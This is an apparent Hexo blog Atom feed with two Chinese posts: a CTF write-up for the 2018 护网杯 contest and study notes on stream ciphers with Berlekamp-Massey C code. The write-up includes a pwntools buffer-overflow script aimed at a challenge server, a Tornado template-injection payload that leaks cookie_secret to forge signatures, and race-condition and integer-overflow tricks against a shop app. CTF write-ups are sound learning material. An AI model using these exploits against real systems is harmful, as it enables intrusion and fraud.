<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-10-13T16:22:35.427Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>护网杯WP</title>
    <link href="http://yoursite.com/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AFWP/"/>
    <id>http://yoursite.com/2018/10/14/护网杯WP/</id>
    <published>2018-10-13T16:00:00.000Z</published>
    <updated>2018-10-13T16:22:35.427Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">PS:https://blog.csdn.net/Super_Yiang/article/details/83043874</span></span><br></pre></td></tr></table></figure><p>护网杯大赛告终，很难，但是学到了很多，码上自己所学的和大佬的WP，并奉上大佬的<a href="https://qingchenldl.github.io/" target="_blank" rel="noopener">博客地址</a></p><h4 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h4><p>题目是“easy xor”，这个题应该和异或运算相关。</p><p>下载文件之后发现这个字符串很像base64加密之后的</p><p><img src="https://i.loli.net/2018/10/13/5bc2023aac738.png" alt=""></p><p>Base64解码试一下：</p><p><img src="https://i.loli.net/2018/10/13/5bc202799c924.png" alt=""></p><p>考虑到可能还有异或操作，虽然有乱码暂时可以接受。然后就是写异或的脚本了，不太清楚和谁异或，写个循环..吧，放脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">a = <span class="string">"AAoHAR1XICciX1IlXiBUVFFUIyRRJFRQVyUnVVMnUFcgIiNXXhs="</span></span><br><span class="line">b=base64.b64decode(a.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">c = b.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> c:</span><br><span class="line">        f=ord(a)^i</span><br><span class="line">        print(chr(f),end=<span class="string">""</span>)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure><p>运行一下，就出flag了</p><p><img src="https://i.loli.net/2018/10/13/5bc202fe9439e.png" alt=""></p><h4 id="Fez-密码题"><a href="#Fez-密码题" class="headerlink" title="Fez(密码题)"></a>Fez(密码题)</h4><p>看题目…没有题目，下载附件发现里边有两个文件</p><p><img src="https://i.loli.net/2018/10/13/5bc2033698cff.png" alt=""></p><p>fez.log</p><p><img src="https://i.loli.net/2018/10/13/5bc203533d79a.png" alt=""></p><p>看过py文件之后很容易知道这是test fez(test,K) fez(m,K)的输出结果</p><p>从后往前看加密算法：</p><p>K是一个包含7组27位随机数的嵌套列表</p><p>M是flag加上几位随机数</p><p>Fez()函数调用了7次round()函数，round()函数是将输入的明文分成两部分，右半部分作为新序列的左半部分，新序列的右半部分通过异或产生。如此循环之后相当于明文的右半部分经过3次异或，而左半部分经过4次异或。</p><p>至此加密算法分析完成。</p><p>由于明文左右两部分均经过加密，因此考虑将K密钥组想象成一个密钥k</p><p>……….开始尝试……..</p><p>假设输入p，执行fez(p,K)</p><p>R1=p_l</p><p>L1=xor(xor(p_l,p_r),K1)</p><p>第一轮加密之后，可看成对R1L1进行3轮加密</p><p>开始解码了….</p><p>已知test和fez(test,K)</p><p>所以，</p><p>tk_l=xor(test_r,k1) </p><p>tk_r=xor(xor(test_l,test_r),k2)</p><p>得到，</p><p>k1=xor(tk_l,test_r)</p><p>k2=xor(xor(test_l,test_r),tk_r)</p><p>由mk=fez(m,K)</p><p>得到，</p><p>mk_l=xor(m_l,k1)</p><p>mk_r=xor(xor(m_l,m_r),k2)</p><p>因此，</p><p>m_l=xor(k1,mk_l)</p><p>m_r=xor(xor(m_l,mk_r),k2)</p><p>分析完成，写脚本吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Lout=R^k1^k2^k4^k5</span></span><br><span class="line"><span class="comment">#Rout=L^R^k0^k1^k2^k3^k5</span></span><br><span class="line"></span><br><span class="line">test = <span class="string">'c8b84d08e5a8e60a49578f387fff5a90e9e7c181734bf05be4f5403c9ea24a0b8741a329991637e11fa69019cd3b01d7c95b65f5abd5'</span></span><br><span class="line">test_out = <span class="string">'5c3660c27cb9b3785a5ce06022e88bc831017e882d39475ea85d919ad9e5ac498f86c553216cab1f8f7468353d46ba8971efa9ca8c81'</span></span><br><span class="line">flag_out = <span class="string">'519ab6fc0e435da00516b844f8fe664bfe9445992f478dc650701739a11ffda5bbeb643159d7e8cd03a2104c798a1ca734b905ee6c76'</span></span><br><span class="line"></span><br><span class="line">L = test.decode(<span class="string">'hex'</span>)[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">R = test.decode(<span class="string">'hex'</span>)[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line"></span><br><span class="line">L2 = test_out.decode(<span class="string">'hex'</span>)[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">R2 = test_out.decode(<span class="string">'hex'</span>)[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">k1 = xor(L2,R)</span><br><span class="line">k2 = xor(xor(L,R), R2)</span><br><span class="line"></span><br><span class="line">L3 = flag_out.decode(<span class="string">'hex'</span>)[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">R3 = flag_out.decode(<span class="string">'hex'</span>)[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line"></span><br><span class="line">R4 = xor(L3,k1)</span><br><span class="line">L4 = xor(xor(k2,R3), R4)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag:'</span>, L4+R4</span><br></pre></td></tr></table></figure><p>Flag：</p><p><img src="https://i.loli.net/2018/10/13/5bc203a26d95c.png" alt=""></p><h4 id="gettingstart-（pwn）"><a href="#gettingstart-（pwn）" class="headerlink" title="gettingstart （pwn）"></a>gettingstart （pwn）</h4><p>先用IDA打开程序:</p><p><img src="https://i.loli.net/2018/10/13/5bc2059472635.png" alt=""></p><p>很明显可以通过溢出buf从而修改v7和v8的值满足判断和验证，所以构造脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process("./task_gettingStart_ktQeERc")</span></span><br><span class="line">p=remote(<span class="string">"49.4.94.186"</span>,<span class="number">31936</span>)</span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line">payload+=<span class="string">"A"</span>*<span class="number">24</span>+p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>)+p64(<span class="number">0x3FB999999999999A</span>)</span><br><span class="line">cmd=<span class="string">"cat flag"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.send(cmd)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure><p>就可以get到flag了。</p><h4 id="easy-tornado-（WEB）"><a href="#easy-tornado-（WEB）" class="headerlink" title="easy tornado （WEB）"></a>easy tornado （WEB）</h4><p>打开链接：</p><p><img src="https://i.loli.net/2018/10/13/5bc207ed9e237.png" alt=""></p><p>分别打开，列出URL和内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.26.79:31093/file?filename=Orz.txt&amp;signature=d18abfad58ea53975f7cefbc16852b0c</span><br><span class="line">Orz.txt </span><br><span class="line">render()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://117.78.26.79:31093/file?filename=hint.txt&amp;signature=6724dcffafb1cbebd3034a845b3fcab3</span><br><span class="line">hint.txt </span><br><span class="line">md5(cookie_secret + md5(filename))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://117.78.26.79:31093/file?filename=flag.txt&amp;signature=a93589fc419617a5a0b91ab5443c5eaa</span><br><span class="line">flag.txt </span><br><span class="line">/fllllllllllag</span><br></pre></td></tr></table></figure><p>发现就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.26.79:31093/file?filename=[文件名]&amp;signature=[签名]</span><br><span class="line"></span><br><span class="line">签名是md5(cookie_secret + md5(filename))</span><br></pre></td></tr></table></figure><p>问题就是找到<code>cookie_secret</code>，再看看<code>Orz.txt</code>里有说<code>render()</code>，看过大佬WP说这是生成模板的函数，所以注入STTI。</p><p>输入读取文件</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.26.79:31093/file?filename=t.txt&amp;signature=6724dcffafb1cbebd3034a845b3fcab3</span><br></pre></td></tr></table></figure><p>发现读取文件失败，但是从失败的链接中发现STTI漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.26.79:31093/error?msg=xxxx</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/13/5bc20bc0296db.png" alt=""></p><p>然后就是测试是否存在过滤，发现过滤的字符有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%&apos;()*-/=[\]_|</span><br></pre></td></tr></table></figure><p>这时候大佬的WP又起作用了</p><p><img src="https://i.loli.net/2018/10/13/5bc20c5bda469.png" alt=""></p><p>并附上<a href="https://tornado.readthedocs.io/en/latest/guide/templates.html#template-syntax" target="_blank" rel="noopener">Tornado官方文档</a></p><p>构造payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.26.79:31093/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/13/5bc20d03ea0fb.png" alt=""></p><p>得到<code>cookie_secret</code>，利用这个<code>cookie_secret</code>，可以写脚本，来获得相应文件的签名值。 </p><p>附上大佬的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">cookie_secret=<span class="string">r'vjEg&gt;W_%Vr.Jd&lt;H(n)@wz&amp;20ut8&#123;i9O$&#125;MBDbCf!YFQ~xh3eA?4cK1X[oIZ*6+5U'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(code)</span>:</span></span><br><span class="line">temp = hashlib.md5(str(code)).hexdigest()</span><br><span class="line"><span class="keyword">return</span> temp</span><br><span class="line">filename = <span class="string">'/fllllllllllag'</span></span><br><span class="line">res = md5(cookie_secret + md5(filename))</span><br><span class="line"><span class="keyword">print</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># 44f26315d2ed77e83fa715d9d6b48f96</span></span><br></pre></td></tr></table></figure><p>跑完脚本，放进URL就出flag了</p><p><img src="https://i.loli.net/2018/10/13/5bc20e51a9dc7.png" alt=""></p><h4 id="ltshop（WEB）"><a href="#ltshop（WEB）" class="headerlink" title="ltshop（WEB）"></a>ltshop（WEB）</h4><p>注册账号，进入系统，发现我们有￥20 </p><p><img src="https://i.loli.net/2018/10/13/5bc20f411f030.png" alt=""></p><p>看一下要求 </p><p><img src="https://i.loli.net/2018/10/13/5bc20f68ef722.png" alt=""></p><p>思路很清晰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开局¥20</span><br><span class="line">一包大辣条¥5</span><br><span class="line">5包大辣条换一包辣条之王</span><br><span class="line">9999999包辣条之王才能换flag</span><br></pre></td></tr></table></figure><p>很明显按照正常思路是不可能买到辣条之王的，更别说要用那么多的辣条之王换flag，所以猜测会用到溢出，但是要溢出至少也需要一包辣条之王才行。</p><p>这时候万能的大佬WP成功上线，条件竞争，大佬经过试验发现一个账户同时登陆两个页面同时买辣条，只会扣一次钱，却会得到两根辣条。大佬用burpsuite进行条件竞争，设置多个线程：</p><p><img src="https://i.loli.net/2018/10/14/5bc218a5ed999.png" alt=""></p><p>然后发现成功的买到了15包大辣条</p><p><img src="https://i.loli.net/2018/10/14/5bc218d2b6402.png" alt=""></p><p>接下来考虑溢出（大佬的WP写着）：</p><p>int： <code>2**32-1 = 4294967295</code></p><p>long： <code>2**63 -1 = 9223372036854775807</code></p><p>longlong： <code>2**64-1 = 18446744073709551615</code></p><p>但是要<strong>注意一点，这个题的逻辑是，numer*5&lt;最大值</strong></p><p>所以，其临界值应该为<code>18446744073709551615 / 5 == 3689348814741910323</code></p><p>于是尝试<code>3689348814741910323+1 == 3689348814741910324</code></p><p>溢出后的值比较小，在辣条的数量之内，从而兑换成功。</p><p><img src="https://i.loli.net/2018/10/14/5bc2194c8d2fc.png" alt=""></p><p><img src="https://i.loli.net/2018/10/14/5bc21978432b6.png" alt=""></p><p>成功的购买到了很多辣条之王，可以兑换苦苦追寻的flag了。</p><p><img src="https://i.loli.net/2018/10/14/5bc21a02d1de5.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight http&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas
      
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>流密码</title>
    <link href="http://yoursite.com/2018/10/10/%E6%B5%81%E5%AF%86%E7%A0%81/"/>
    <id>http://yoursite.com/2018/10/10/流密码/</id>
    <published>2018-10-09T16:00:00.000Z</published>
    <updated>2018-10-10T15:47:20.286Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">PS:https://blog.csdn.net/Super_Yiang/article/details/83005224</span></span><br></pre></td></tr></table></figure><p>初学密码学，今天学了流密码，做做笔记。</p><h5 id="流密码体制模型"><a href="#流密码体制模型" class="headerlink" title="流密码体制模型"></a>流密码体制模型</h5><p><img src="https://i.loli.net/2018/10/10/5bbe144397d34.png" alt=""></p><h5 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h5><p>​    根据加密器中记忆元件的存储状态是否依赖于输入的明文字符可分为两类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.同步流密码          #独立于明文字符</span><br><span class="line">2.自同步流密码        #依赖于输入的明文字符</span><br></pre></td></tr></table></figure><p>​    目前最常用的流密码体制是二元加法流密码，是一种同步流密码，其加密变换可表示为异或函数。</p><h5 id="线性反馈移位寄存器"><a href="#线性反馈移位寄存器" class="headerlink" title="线性反馈移位寄存器"></a>线性反馈移位寄存器</h5><p>​    移位寄存器是流密码长产生密钥流的一个主要组成部分。</p><p>​    线性反馈移位寄存器（ LFSR）是指，给定前一状态的输出，将该输出的<a href="https://baike.baidu.com/item/%E7%BA%BF%E6%80%A7%E5%87%BD%E6%95%B0/1085447" target="_blank" rel="noopener">线性函数</a>再用作输入的移位寄存器。异或运算是最常见的单比特线性函数：对寄存器的某些位进行异或操作后作为输入，再对寄存器中的各比特进行整体移位。 </p><p>​    线性反馈移位寄存器输出序列的性质完全由其反馈函数决定。</p><p>1、n级线性反馈移位寄存器==最多==有2^n^个不同的状态</p><p>2、n级n级线性反馈移位寄存器的状态周期==小于等于==2^n^-1</p><p>3、周期达到最大值的序列称为m序列</p><p>​    仅能被非0常数或自身的常数倍除尽，但不能被其他多项式除尽的多项式称为即约多项式或不可约多项式。</p><p>​    n级LFSR产生的序列有最大周期2^n^-1的==必要条件==是其特征多项式为不可约的。</p><p>​    若n次不可约多项式p(x)的阶为2^n^-1，则称p(x)是n次本原多项式。{a~i~}为m序列的==充要条件==为p(x)是本原多项式。</p><h5 id="伪随机序列"><a href="#伪随机序列" class="headerlink" title="伪随机序列"></a>伪随机序列</h5><p>​    Golomb对伪随机周期序列提出了应满足的如下3个==随机公设==：</p><p>（1）在序列的一个周期内，0与1的个数相差至多为1。</p><p>（2）在序列的一个周期内，长为1的游程占游程总数的1/2，长为2的游程占游程总数的1/4，长多为 i 的游程占游程总数的 1/2^i^ ，且在等长的游程中0的游程个数和1的游程个数相等。</p><p>（3）异自相关函数是一个常数。</p><p>​    n长m序列满足Golomb的3个随机性公设，具有如下==性质==：</p><p>（1）在一个周期内，0和1出现的次数分别为2^n-1^-1和2^n-1^。</p><p>（2）在一个周期内，总游程数为2^n^-1；对 1≤ i ≤ n-2，长为 i 的游程有2^n-i-1^个，且0和1游程各半；长为n-1的0游程一个，长为n的1游程一个。</p><h5 id="B-M算法"><a href="#B-M算法" class="headerlink" title="B-M算法"></a>B-M算法</h5><p>​    直接给公式：</p><p><img src="https://i.loli.net/2018/10/10/5bbe1d2d7f53e.png" alt=""></p><p>附上码来的的C代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line">​</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> bin;</span><br><span class="line">​</span><br><span class="line"><span class="comment">//将接受的01字符串转化为一个无符号整形</span></span><br><span class="line"><span class="function">bin <span class="title">strToBinary</span><span class="params">(<span class="keyword">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   bin result=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">int</span> len=<span class="built_in">strlen</span>(str);</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">   &#123;</span><br><span class="line">        <span class="keyword">if</span>(str[i]==<span class="string">'1'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            result=(result&lt;&lt;<span class="number">1</span>)+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            result&lt;&lt;=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line"><span class="comment">//利用list序列，cn参数，以及ln+1长度求出dn(dn为0或1)</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">getbn</span><span class="params">(bin <span class="built_in">list</span>,bin cn,<span class="keyword">int</span> seek)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> bn=((cn&gt;&gt;seek) &amp; (<span class="built_in">list</span>&gt;&gt;seek)) &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>((--seek)&gt;<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        bn^=((cn&gt;&gt;seek) &amp; (<span class="built_in">list</span>&gt;&gt;seek)) &amp; <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bn;</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line">​</span><br><span class="line"><span class="comment">//通过命令行接收01序列</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//简单处理得到的参数</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">2</span>!=argc)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">"error:parameter is not correct\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">22</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>])&gt;<span class="number">32</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">"error:parameter is too big\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">22</span>);</span><br><span class="line">    &#125;</span><br><span class="line">​</span><br><span class="line">    <span class="comment">//序列的长度</span></span><br><span class="line">    <span class="keyword">int</span> N=<span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line">​</span><br><span class="line">    <span class="comment">//list为格式化的序列</span></span><br><span class="line">    bin <span class="built_in">list</span>=strToBinary(argv[<span class="number">1</span>]);</span><br><span class="line">​</span><br><span class="line">    <span class="keyword">int</span> n=<span class="number">0</span>,ln=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> bn;</span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="comment">//初始化fm，每一位分别是cln,cln-1,...,c1,c0</span></span><br><span class="line">    bin fm=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//初始化f(x)，每一位分别是cln,cln-1,...c1,c0</span></span><br><span class="line">    bin f=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//判断l0,l1,...,ln是否全为0</span></span><br><span class="line">    <span class="keyword">bool</span> flagIs0=<span class="literal">true</span>;</span><br><span class="line">    <span class="comment">//临时保存fn-1</span></span><br><span class="line">    bin fn_1;</span><br><span class="line">​</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        bn=getbn(<span class="built_in">list</span>&gt;&gt;(N-n<span class="number">-1</span>),f,ln);</span><br><span class="line">        <span class="keyword">if</span>(bn)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(flagIs0)</span><br><span class="line">            &#123;</span><br><span class="line">                m=n;</span><br><span class="line">                fm=f;</span><br><span class="line">                f=(<span class="number">1</span>&lt;&lt;(n+<span class="number">1</span>)) | <span class="number">1</span>;</span><br><span class="line">                ln=n+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                fn_1=f;</span><br><span class="line">                f^=fm&lt;&lt;(n-m);</span><br><span class="line">                <span class="keyword">if</span>(ln&lt;n+<span class="number">1</span>-ln)</span><br><span class="line">                &#123;</span><br><span class="line">                    m=n;</span><br><span class="line">                    fm=fn_1;</span><br><span class="line">                    ln=n+<span class="number">1</span>-ln;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span>!=ln)</span><br><span class="line">                flagIs0=<span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        n++;</span><br><span class="line">    &#125;<span class="keyword">while</span>(n&lt;N);</span><br><span class="line">​</span><br><span class="line">    <span class="comment">//打印f</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"f(x)=1"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;N;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((f&gt;&gt;i)&amp;<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"+x^%d"</span>,i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    </span><br><span class="line">​</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
